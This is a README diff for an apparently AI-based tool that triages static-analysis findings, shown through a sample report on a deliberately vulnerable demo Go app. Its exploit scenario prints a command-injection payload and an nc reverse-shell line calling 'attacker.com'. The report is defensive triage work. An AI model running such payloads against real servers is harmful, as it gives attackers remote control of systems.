@@ -82,13 +82,14 @@ cost breakdown. A trimmed excerpt from the demo run:
 ```markdown
 # Security Scan Triage Report
 
-**Date:** 2026-09-13 14:28:41
+**Date:** 2026-09-15 14:53:19
 **Input file:** `examples/findings.sarif`
 **Models:** Claude (Bedrock) (us.anthropic.claude-sonnet-4-5-20250929-v1:0)
+**Analysts:** strict, business
 **Context strategy:** shared (srcroot `examples/sample-app`)
 **Effort:** low
 **Findings analysed:** 2
-**Total cost:** $0.1369
+**Total cost:** $0.3318
 
 ## Summary
 
@@ -103,60 +104,76 @@ cost breakdown. A trimmed excerpt from the demo run:
 ## 🔴 F001 — Command injection
 
 **File:** `main.go` line 30
-**Severity:** HIGH  |  **CWE:** CWE-78  |  **CVSS 4.0:** 9.3 Critical
-**CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N`
-**Final verdict:** CONFIRMED_REAL  (agreement: single)
+**Severity:** HIGH  |  **CWE:** CWE-78  |  **CVSS 4.0:** 10.0 Critical
+**CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`
+**Final verdict:** CONFIRMED_REAL  (agreement: all)
 **Classification:** TRUE_POSITIVE
 
-Confirmed command injection in demo training app—exploitable if deployed but
-intentionally vulnerable by design; educate on demo code isolation rather than
-patching.
+CONFIRMED: Unauthenticated command injection in the `/ping` endpoint allows
+arbitrary code execution; the vulnerability is real and exploitable despite
+the intentional demo context.
 
 ### Analysis
 
-**Exploit scenario:** Attacker sends `GET /ping?host=example.com;whoami`. The
-shell interprets metacharacters, executing both ping and the injected command.
-No authentication required, works on first attempt, grants shell access with
-service process privileges.
+**Exploit scenario:** Attacker sends `GET /ping?host=example.com;whoami` to the
+unauthenticated endpoint. The shell interprets metacharacters, executing
+arbitrary commands with the web service's privileges. A reverse shell can be
+spawned with `?host=x|nc attacker.com 4444 -e /bin/sh`, granting full
+interactive control of the server.
 
-**Triage reasoning:** Textbook command injection with direct, unauthenticated
-network reachability. User input flows unvalidated into `sh -c`. Zero
-mitigations present (contrast with the `/users` endpoint, which has regex
-validation).
+**Triage reasoning:** Textbook command injection with no mitigations. While the
+code comments mark it as intentional demo/vulnerable code, the vulnerability is
+functionally real: the code exists, compiles, runs, and is exploitable if
+deployed. The `/ping` endpoint is a direct HTTP route with zero authentication,
+validation, or sandboxing.
 
-**Counter-argument considered:** What if this demo code was accidentally
-copied into a production service? Demo code has a history of escaping into
-real environments.
+**Counter-argument considered:** The code is explicitly documented as a
+demo/vulnerable application "not intended for production," so calling this a
+real vulnerability misrepresents its purpose. It is educational code that
+SHOULD be vulnerable by design.
 
-**Why the counter-argument fails:** The challenge is valid, but the verdict
-stands: the vulnerability is confirmed real and exploitable if deployed. The
-demo context affects prioritization, not the technical verdict.
+**Why the counter-argument fails:** The challenge is valid regarding intent, but
+doesn't change the technical verdict. This IS a real, exploitable command
+injection vulnerability — the fact that it is intentional for training purposes
+affects prioritization and remediation, not whether the vulnerability exists.
 
 | Role | Verdict | Cost | Notes |
 |---|---|---|---|
-| explorer | — | $0.0232 | shared context gathering |
-| claude (voter) | CONFIRMED_REAL | $0.0479 | direct, unvalidated input to `sh -c`; no mitigations |
+| explorer | — | $0.0278 | shared context gathering |
+| claude (voter) | CONFIRMED_REAL | $0.0450 | unvalidated `/ping` host param flows to `sh -c`; zero mitigations |
+| strict (analyst) | CONFIRMED_REAL | $0.0470 | grounded source→sink trace; evidence clears the bar |
+| business (analyst) | CONFIRMED_REAL | $0.0497 | real RCE; demo intent affects priority, not the verdict |
 
 ## 🟢 F002 — SQL injection
 
 **File:** `users.go` line 22
 **Severity:** MEDIUM  |  **CWE:** CWE-89  |  **CVSS 4.0:** 0.0 None
-**Final verdict:** NOT_EXPLOITABLE  (agreement: single)
+**CVSS vector:** `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N`
+**Final verdict:** NOT_EXPLOITABLE  (agreement: all)
 **Classification:** FALSE_POSITIVE
 
-SQL injection via string interpolation in `users.go:22` is NOT exploitable
-due to strict `^[0-9,]+$` regex validation preventing all SQL metacharacters,
-though parameterized queries should replace this anti-pattern.
+SQL injection pattern in the `/users` endpoint is NOT exploitable due to
+robust allowlist validation; refactor to parameterized queries for
+maintainability (LOW priority).
 
 ### Analysis
 
 **Counter-argument considered:** Could the regex validation be bypassed via
-encoding tricks, null bytes, or multi-line attacks?
+encoding tricks, null bytes, or multi-line attacks — or exploit an
+implementation flaw in Go's regexp engine?
 
-**Why the counter-argument fails:** Go's regex engine handles `^[0-9,]+$`
-unambiguously — the anchors prevent partial matches, and validation happens
-before the SQL construction with an early return on failure. No encoding,
-Unicode normalization, or null byte attack can bypass it.
+**Why the counter-argument fails:** Go's regexp package is well-tested and the
+anchored pattern `^[0-9,]+$` is straightforward with no known bypasses. No SQL
+dialect permits injection using only numeric digits and commas — SQL syntax
+fundamentally requires metacharacters, operators, keywords, or quotes. The
+validation is effective and the finding is not exploitable as deployed.
+
+| Role | Verdict | Cost | Notes |
+|---|---|---|---|
+| explorer | — | $0.0273 | shared context gathering |
+| claude (voter) | NOT_EXPLOITABLE | $0.0419 | anchored allowlist rejects every SQL metacharacter |
+| strict (analyst) | NOT_EXPLOITABLE | $0.0446 | allowlist validation holds; code smell only |
+| business (analyst) | NOT_EXPLOITABLE | $0.0484 | effective as deployed; parameterize for maintainability |
 ```
 
 ## Install
